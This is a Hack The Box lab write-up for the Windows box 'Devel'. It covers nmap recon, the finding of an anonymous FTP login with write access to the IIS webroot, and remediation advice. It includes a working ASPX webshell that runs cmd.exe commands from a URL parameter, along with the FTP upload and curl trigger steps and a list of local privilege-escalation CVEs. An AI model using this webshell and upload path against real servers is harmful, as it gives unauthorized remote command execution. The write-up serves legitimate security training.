<div align="center">

# 📂 HTB: Devel

![OS](https://img.shields.io/badge/OS-Windows-0078D6?style=flat-square&logo=windows&logoColor=white)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat-square)
![Status](https://img.shields.io/badge/Status-Recon%20%2B%20Confirmed%20Vuln-yellow?style=flat-square)

`hackthebox` `windows` `iis` `ftp` `unrestricted-file-upload`

</div>

---

> **TL;DR** — Anonymous FTP has write access to the live IIS webroot. Drop an ASPX webshell over FTP, hit it over HTTP, and it executes as the IIS worker process. This writeup covers recon through confirming the vulnerability — the notes don't record the actual webshell trigger, privesc, or flags, so treat the exploitation section as the documented path forward rather than a completed run.

## 📋 Box Info

| | |
|---|---|
| 🖥️ **OS** | Windows (IIS 7.5 era — Windows 7 / Server 2008 R2) |
| 🎯 **Target** | `<TARGET_IP>` |
| 🎚️ **Difficulty** | Easy |
| 📅 **Date** | January 3, 2026 |
| 🏁 **Status** | 🟡 Vulnerability confirmed — exploitation/privesc not logged |

## 🔍 Recon

```bash
nmap -sV -sC -p- <TARGET_IP> -T4 --min-rate 5000
```

Only two ports open, out of 65,535 scanned — the rest sit `filtered`:

| Port | Service |
|:---:|---|
| `21` | Microsoft ftpd — **anonymous login allowed (FTP code 230)** |
| `80` | Microsoft IIS httpd 7.5 |

The FTP directory listing immediately confirms the webroot connection:

```
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|   <DIR>          aspnet_client
|                  iisstart.htm
|                  welcome.png
```

`iisstart.htm` and `welcome.png` are IIS's own default files — this FTP root **is** `C:\inetpub\wwwroot`.

---

## 🚩 Confirmed Vulnerability — Anonymous FTP Write to Webroot

> ⚠️ **Root cause:** anonymous FTP is enabled *and* granted write access to a directory that IIS serves and executes content from (CWE-276, incorrect default permissions). Any file dropped over FTP is immediately reachable — and if it's `.aspx`, executable — over HTTP.

**The documented path forward:**

```bash
ftp <TARGET_IP>
# user: anonymous / blank password
```

Upload a minimal ASPX webshell:

```aspx
<%@ Page Language="C#" %>
<% Response.Write(new System.Diagnostics.Process{
     StartInfo=new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["c"])
     {RedirectStandardOutput=true,UseShellExecute=false}
   }.Start().StandardOutput.ReadToEnd()); %>
```

```bash
put shell.aspx
```

```bash
curl "http://<TARGET_IP>/shell.aspx?c=whoami"
```

That should return the IIS worker process identity — typically `IIS APPPOOL\DefaultAppPool` or `NT AUTHORITY\NETWORK SERVICE`.

**From there (standard path for this box's era, not independently verified here):**
- `systeminfo` to confirm exact build
- Given the IIS 7.5 / 2008R2-era fingerprint, known local kernel exploits worth checking: **MS15-051** (CVE-2015-1701), **MS16-032** (CVE-2016-0099), **MS10-015** (CVE-2010-0232)
- Escalate to SYSTEM, capture both flags

---

## 📦 Other Findings

| Severity | Finding |
|---|---|
| Low | HTTP TRACE method enabled — minor XST exposure, low practical risk on modern browsers. |
| Informational | `Server: Microsoft-IIS/7.5` header discloses version, pointing at an EOL OS generation (Server 2008 R2 / Windows 7 extended support ended January 2020). |

## 🛠️ Remediation (for what's confirmed)

| Finding | Fix |
|---|---|
| Anonymous FTP write access to IIS webroot | Disable anonymous FTP entirely, or at minimum strip write permissions; separate any legitimate upload path from anything IIS executes. |
| Executable uploads reachable over HTTP | Use IIS request filtering to block execution of files in upload-reachable paths. |
| EOL OS / IIS version | Upgrade — this build has been out of extended support since 2020. |

---

<div align="center">

*Part of the [D4RKGUNN3R Hack The Box Walkthroughs](../) series.*

⚠️ *Work in progress — go back and log the webshell trigger, privesc method, and flags to close this one out.*

</div>
